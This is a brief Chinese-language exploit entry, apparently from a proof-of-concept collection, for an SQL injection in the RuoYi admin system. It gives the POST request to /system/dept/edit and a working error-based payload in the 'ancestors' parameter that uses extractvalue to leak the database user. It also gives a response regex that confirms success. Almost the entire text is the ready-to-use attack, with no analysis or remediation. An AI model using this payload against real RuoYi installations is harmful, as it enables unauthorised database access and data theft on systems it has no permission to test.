# 若依RuoYi系统sql注入2

若依 ｜ SQL注入 ｜ —
- **请求**：`POST /system/dept/edit HTTP/1.1`

**Payload**
```
DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$